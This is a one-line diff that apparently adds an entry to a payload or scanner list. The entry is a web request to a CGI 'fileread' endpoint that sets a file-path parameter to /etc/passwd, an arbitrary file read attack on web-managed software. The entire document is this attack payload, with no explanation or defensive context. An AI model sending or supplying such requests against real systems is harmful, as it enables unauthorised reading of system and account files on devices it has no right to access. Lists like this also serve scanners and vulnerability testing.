@@ -1,0 +1,1 @@
+/cgi-bin/operator/fileread?READ.filePath=/etc/passwd
